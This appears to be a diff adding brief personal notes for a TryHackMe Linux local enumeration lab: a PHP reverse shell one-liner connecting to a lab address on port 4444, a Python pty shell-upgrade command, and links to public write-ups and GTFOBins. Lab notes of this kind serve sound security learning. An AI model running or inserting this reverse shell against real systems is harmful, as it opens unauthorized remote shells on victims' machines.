@@ -1,0 +1,11 @@
+php -r '$sock=fsockopen("10.6.88.227",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+
+https://tryhackme.com/room/lle
+http://related.cupprs.com/linux-local-enumeration/
+https://cybertroll.medium.com/local-enumeration-writeup-tryhackme-27ca1a723655
+https://halloper123.medium.com/tryhackme-linux-local-enumartion-writeup-4a8640e5a4fa
+https://www.thedutchhacker.com/linux-local-enumeration-on-tryhackme/
+https://www.kumaratuljaiswal.in/2021/01/tryhackme-linux-local-enumeration.html
+https://gtfobins.github.io/gtfobins/perl/
